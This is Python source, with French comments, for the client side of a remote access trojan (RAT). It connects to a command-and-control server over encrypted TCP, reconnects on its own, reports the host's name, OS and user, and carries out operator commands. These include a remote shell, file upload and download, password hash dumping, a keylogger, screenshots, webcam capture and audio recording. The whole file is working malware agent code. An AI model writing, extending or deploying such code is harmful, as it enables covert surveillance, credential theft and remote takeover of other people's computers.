"""Client RAT — se connecte au serveur et exécute les commandes reçues."""

import argparse
import base64
import logging
import os
import platform
import socket
import time

from .commands import (
    cmd_download,
    cmd_hashdump,
    cmd_help,
    cmd_ipconfig,
    cmd_keylogger,
    cmd_record_audio,
    cmd_screenshot,
    cmd_search,
    cmd_shell,
    cmd_upload,
    cmd_webcam_snapshot,
    cmd_webcam_stream,
)
from .crypto import CryptoHandler
from .protocol import Protocol

logger = logging.getLogger(__name__)

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 8888
RECONNECT_DELAY = 5


class Client:
    """Agent RAT qui se connecte au serveur C2 et exécute les commandes."""

    def __init__(self, host: str, port: int, key: bytes):
        self._host = host
        self._port = port
        self._crypto = CryptoHandler(key)
        self._sock: socket.socket | None = None
        self._protocol: Protocol | None = None
        self._running = False

    def connect(self) -> bool:
        """Établit la connexion TCP chiffrée avec le serveur."""
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.connect((self._host, self._port))
            self._protocol = Protocol(self._sock, self._crypto)
            self._running = True
            logger.info("Connecté à %s:%d", self._host, self._port)

            self._protocol.send(
                {
                    "type": "info",
                    "hostname": platform.node(),
                    "os": platform.system(),
                    "user": self._get_username(),
                }
            )
            return True
        except Exception as exc:
            logger.error("Connexion échouée : %s", exc)
            self._cleanup_socket()
            return False

    def run(self, reconnect: bool = True) -> None:
        """Boucle principale : connexion, réception et exécution des commandes."""
        while True:
            if not self.connect():
                if not reconnect:
                    break
                logger.info("Reconnexion dans %ds...", RECONNECT_DELAY)
                time.sleep(RECONNECT_DELAY)
                continue

            try:
                while self._running:
                    message = self._protocol.recv()
                    if message is None:
                        logger.info("Serveur déconnecté")
                        break
                    self._dispatch(message)
            except Exception as exc:
                logger.error("Erreur client : %s", exc)
            finally:
                self._cleanup_socket()

            if not reconnect:
                break
            logger.info("Reconnexion dans %ds...", RECONNECT_DELAY)
            time.sleep(RECONNECT_DELAY)

    def _dispatch(self, message: dict) -> None:
        """Dispatche une commande reçue vers le handler approprié."""
        command = message.get("command", "")
        args = message.get("args", [])
        data = message.get("data", "")

        logger.info("Commande reçue : %s", command)

        handler = self._HANDLERS.get(command)
        if handler is None:
            self._protocol.send_response(command, f"Commande inconnue : {command}", "error")
            return

        handler(self, command, args, data)

    def _handle_help(self, command: str, _args: list, _data: str) -> None:
        self._protocol.send_response(command, cmd_help())

    def _handle_ipconfig(self, command: str, _args: list, _data: str) -> None:
        self._protocol.send_response(command, cmd_ipconfig())

    def _handle_shell(self, command: str, args: list, _data: str) -> None:
        if not args:
            self._protocol.send_response(command, "Erreur : aucune commande fournie", "error")
            return
        result = cmd_shell(" ".join(args))
        self._protocol.send_response(command, result)

    def _handle_download(self, command: str, args: list, _data: str) -> None:
        if not args:
            self._protocol.send_response(command, "Erreur : chemin manquant", "error")
            return
        result = cmd_download(args[0])
        if isinstance(result, tuple):
            self._protocol.send_file_response(command, result[0], result[1])
        else:
            self._protocol.send_response(command, result, "error")

    def _handle_upload(self, command: str, args: list, data: str) -> None:
        if not args or not data:
            self._protocol.send_response(command, "Erreur : chemin ou données manquants", "error")
            return
        file_data = base64.b64decode(data)
        result = cmd_upload(args[0], file_data)
        self._protocol.send_response(command, result)

    def _handle_screenshot(self, command: str, _args: list, _data: str) -> None:
        result = cmd_screenshot()
        if isinstance(result, tuple):
            self._protocol.send_file_response(command, result[0], result[1])
        else:
            self._protocol.send_response(command, result, "error")

    def _handle_search(self, command: str, args: list, _data: str) -> None:
        if len(args) < 2:
            self._protocol.send_response(command, "Usage : search <chemin> <motif>", "error")
            return
        result = cmd_search(args[0], args[1])
        self._protocol.send_response(command, result)

    def _handle_hashdump(self, command: str, _args: list, _data: str) -> None:
        self._protocol.send_response(command, cmd_hashdump())

    def _handle_keylogger(self, command: str, args: list, _data: str) -> None:
        if not args:
            self._protocol.send_response(command, "Usage : keylogger <start|stop|dump>", "error")
            return
        result = cmd_keylogger(args[0])
        self._protocol.send_response(command, result)

    def _handle_webcam_snapshot(self, command: str, _args: list, _data: str) -> None:
        result = cmd_webcam_snapshot()
        if isinstance(result, tuple):
            self._protocol.send_file_response(command, result[0], result[1])
        else:
            self._protocol.send_response(command, result, "error")

    def _handle_webcam_stream(self, command: str, args: list, _data: str) -> None:
        duration = int(args[0]) if args else 5
        result = cmd_webcam_stream(duration)
        if isinstance(result, tuple):
            self._protocol.send_file_response(command, result[0], result[1])
        else:
            self._protocol.send_response(command, result, "error")

    def _handle_record_audio(self, command: str, args: list, _data: str) -> None:
        duration = int(args[0]) if args else 5
        result = cmd_record_audio(duration)
        if isinstance(result, tuple):
            self._protocol.send_file_response(command, result[0], result[1])
        else:
            self._protocol.send_response(command, result, "error")

    def _handle_exit(self, _command: str, _args: list, _data: str) -> None:
        self._running = False

    _HANDLERS = {
        "help": _handle_help,
        "ipconfig": _handle_ipconfig,
        "shell": _handle_shell,
        "download": _handle_download,
        "upload": _handle_upload,
        "screenshot": _handle_screenshot,
        "search": _handle_search,
        "hashdump": _handle_hashdump,
        "keylogger": _handle_keylogger,
        "webcam_snapshot": _handle_webcam_snapshot,
        "webcam_stream": _handle_webcam_stream,
        "record_audio": _handle_record_audio,
        "exit": _handle_exit,
    }

    def _cleanup_socket(self) -> None:
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
            self._sock = None
        self._protocol = None

    @staticmethod
    def _get_username() -> str:
        try:
            return os.getlogin()
        except OSError:
            return os.environ.get("USER", os.environ.get("USERNAME", "unknown"))


def main() -> None:
    parser = argparse.ArgumentParser(description="RAT Client")
    parser.add_argument("--host", default=DEFAULT_HOST, help="Adresse du serveur")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Port du serveur")
    parser.add_argument("--key", required=True, help="Clé de chiffrement Fernet")
    parser.add_argument(
        "--no-reconnect", action="store_true", help="Désactiver la reconnexion automatique"
    )
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )

    client = Client(args.host, args.port, args.key.encode())
    try:
        client.run(reconnect=not args.no_reconnect)
    except KeyboardInterrupt:
        logger.info("Client interrompu")


if __name__ == "__main__":
    main()
